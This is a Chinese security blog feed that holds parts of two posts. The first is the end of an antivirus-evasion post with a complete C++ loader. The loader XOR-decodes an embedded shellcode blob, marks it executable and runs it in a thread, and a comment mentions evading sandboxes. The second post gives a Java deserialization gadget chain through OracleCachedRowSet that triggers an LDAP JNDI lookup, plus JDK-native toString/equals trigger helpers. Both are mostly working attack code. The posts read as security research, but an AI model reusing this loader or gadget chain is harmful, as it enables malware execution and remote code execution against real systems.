0;<br>&#125;<br><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>​</p><h3 id="0x02-InterlockedXorRelease函数"><a href="#0x02-InterlockedXorRelease函数" class="headerlink" title="0x02 InterlockedXorRelease函数"></a>0x02 InterlockedXorRelease函数</h3><p>我在学习《Windows核心编程》的过程中，发现InterlockedXorRelease函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">_InterlockedXor8</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">char</span> <span class="hljs-keyword">volatile</span> *Destination,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">char</span>          Value</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>Destination</code>：指向要执行异或操作的变量的指针。这个参数应该是一个 <code>volatile char</code> 类型的指针，表示一个 8 位有符号整数变量。</li><li><code>Value</code>：要与 <code>Destination</code> 变量进行异或操作的值。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++) &#123;<br>    <span class="hljs-comment">//buf[i] ^= 10;</span><br>    _InterlockedXor8(buf + i, <span class="hljs-number">10</span>);   <span class="hljs-comment">//bu按位xor</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><br> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br><span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br><span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br><span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br><span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br><span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br><span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br><span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br><span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br><span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br><span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br><span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br><span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br><br>    <span class="hljs-type">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>    DWORD dwOldProtect; <span class="hljs-comment">// 内存页属性</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br>    <span class="hljs-comment">// 获取shellcode大小</span><br>    shellcode_size = <span class="hljs-built_in">sizeof</span>(buf);<br><br>    <span class="hljs-comment">/* 增加异或代码 */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++) &#123;<br>        <span class="hljs-comment">//buf[i] ^= 10;</span><br>        _InterlockedXor8(buf + i, <span class="hljs-number">10</span>);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    VirtualAlloc(</span><br><span class="hljs-comment">        NULL, // 基址</span><br><span class="hljs-comment">        800,  // 大小</span><br><span class="hljs-comment">        MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>    <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_size);<br><br>    <span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>    <span class="hljs-built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);<br><br>    <span class="hljs-comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span><br><br>    hThread = <span class="hljs-built_in">CreateThread</span>(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>        (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>        &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://rvn0xsy.github.io/">https://rvn0xsy.github.io</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新jdk原生入口到jndi</title>
    <link href="/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/"/>
    <url>/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/</url>
    
    <content type="html"><![CDATA[<p>首发先知 <a href="https://xz.aliyun.com/t/14732">https://xz.aliyun.com/t/14732</a></p><h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01  起因"></a>0x01  起因</h2><p>​tj哥在调试某1day时，想找其他的触发点，最后找到了oracle数据库的jndi。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>OracleCachedRowSet#getConnectionInternal</p><p><img src="image-20240603204410886.png" alt="image-20240603204410886"></p><p>这里直接new了一个InitialContext<img src="image-20240523154007471.png" alt="image-20240523154007471"></p><p><img src="image-20240523154030734.png" alt="image-20240523154030734"></p><p>然后进行了lookup，然后触发。</p><p>oracle.jdbc.rowset.OracleRowSet#getDataSourceName</p><p><img src="image-20240523154110189.png" alt="image-20240523154110189"></p><p>可以看到是直接获取这个属性。可控。</p><p><img src="image-20240726114157046.png" alt="image-20240726114157046"></p><p>抽象类，可序列化</p><p><img src="image-20240523154307368.png" alt="image-20240523154307368"></p><p>oracle.jdbc.rowset.OracleCachedRowSet#getConnection 这个方法直接调用。</p><p>那种想到需要触发OracleCachedRowSet的getter()方法就能触发。</p><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Oracle</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br><br><span class="hljs-comment">//        Field dataSourceName_1 = OracleCachedRowSet.class.getSuperclass().getDeclaredField(&quot;dataSourceName&quot;); dataSourceName_1.setAccessible(true); dataSourceName_1.set(oracleCachedRowSet, &quot;ldap://127.0.0.1:4444/dc=example,dc=com&quot;);</span><br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/remoteExploit8&quot;</span>);<br>        oracleCachedRowSet.getConnection();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240726114207978.png" alt="image-20240726114207978"></p><p>日常jndi招呼计算器。</p><h2 id="0x04-gadget"><a href="#0x04-gadget" class="headerlink" title="0x04 gadget"></a>0x04 gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Oracle</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dataSourceName_1</span> <span class="hljs-operator">=</span> OracleCachedRowSet.class.getSuperclass().getDeclaredField(<span class="hljs-string">&quot;dataSourceName&quot;</span>);<br>        dataSourceName_1.setAccessible(<span class="hljs-literal">true</span>);<br>        dataSourceName_1.set(oracleCachedRowSet, <span class="hljs-string">&quot;ldap://127.0.0.1:1389/remoteExploit8&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        v1.add(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;111&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        v2.add(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;222&quot;</span>);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;metaData&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>&#125;);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;matchColumnNames&quot;</span>, v1);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;matchColumnIndexes&quot;</span>, v2);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;monitorLock&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(oracleCachedRowSet);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        utils.setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, node);<br>        <span class="hljs-type">byte</span>[] serialize = utils.serialize(badAttributeValueExpException);<br>        utils.unserialize(serialize);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240523170745040.png" alt="image-20240523170745040"></p><p>招呼计算器成功</p><h2 id="0x05-jdk原生gadget"><a href="#0x05-jdk原生gadget" class="headerlink" title="0x05 jdk原生gadget"></a>0x05 jdk原生gadget</h2><p>​那要是常见触发tostring的类（若badAttributeValueExpException）被搬掉了，没别的依赖。</p><p>所以现在需要找一条新的tostring。</p><p>javax.swing.UIDefaults.TextAndMnemonicHashMap</p><p><img src="image-20240726114221015.png" alt="image-20240726114221015"></p><p>可以看到是map,然后调用了key的tostring，非常完美。</p><p>java.util.AbstractMap#equals</p><p><img src="image-20240521204924499.png" alt="image-20240521204924499"></p><p>m是一个map，改成javax.swing.UIDefaults.TextAndMnemonicHashMap就可以走通，非常合理，java.util.AbstractMap是一个抽象类，所以我们只要找一个继承它又没有实现equals的方法就行了,感觉非常多了，haspmap，hashtable都可以。</p><h3 id="hashtable触发tostring"><a href="#hashtable触发tostring" class="headerlink" title="hashtable触发tostring"></a>hashtable触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    tHashMap2.put(o,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    hashtable.put(tHashMap1,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    hashtable.put(tHashMap2,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br><br>    tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>    tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hashmap触发tostring"><a href="#hashmap触发tostring" class="headerlink" title="hashmap触发tostring"></a>hashmap触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmapToString</span><span class="hljs-params">(Object o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o1,<span class="hljs-literal">null</span>);<br>    tHashMap2.put(o2,<span class="hljs-literal">null</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>    Array.set(arr, <span class="hljs-number">0</span>, node1);<br>    Array.set(arr, <span class="hljs-number">1</span>, node2);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;table&quot;</span>, arr);<br>    <span class="hljs-keyword">return</span> hashMap;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hashtable触发equals"><a href="#Hashtable触发equals" class="headerlink" title="Hashtable触发equals"></a>Hashtable触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTable</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    nodeC = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="HashMap-触发equals"><a href="#HashMap-触发equals" class="headerlink" title="HashMap 触发equals"></a>HashMap 触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ConcurrentHashMap触发equals"><a href="#ConcurrentHashMap触发equals" class="headerlink" title="ConcurrentHashMap触发equals"></a>ConcurrentHashMap触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeConcurrentMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>     ConcurrentHashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;sizeCtl&quot;</span>, <span class="hljs-number">2</span>);<br>     Class&lt;?&gt; 